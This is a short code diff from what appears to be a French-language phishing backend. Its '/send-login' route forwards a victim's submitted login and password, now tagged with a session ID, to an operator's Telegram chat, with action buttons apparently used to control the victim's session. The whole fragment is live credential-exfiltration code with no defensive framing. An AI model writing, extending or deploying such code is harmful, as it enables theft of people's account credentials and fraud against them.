@@ -120,7 +120,7 @@ app.post('/send-login', (req, res) => {
   };
   saveData(data);
 
-  bot.sendMessage(CHAT_ID, `👤 Identifiants :\n👤 Login: ${login}\n🔐 Password: ${password}\n\nChoisissez une action :`, {
+  bot.sendMessage(CHAT_ID, `User: ${sessionId} \n 👤 Identifiants :\n👤 Login: ${login}\n🔐 Password: ${password}\n\nChoisissez une action :`, {
     reply_markup: {
       inline_keyboard: [[
         { text: 'Error', callback_data: `error|${sessionId}` },
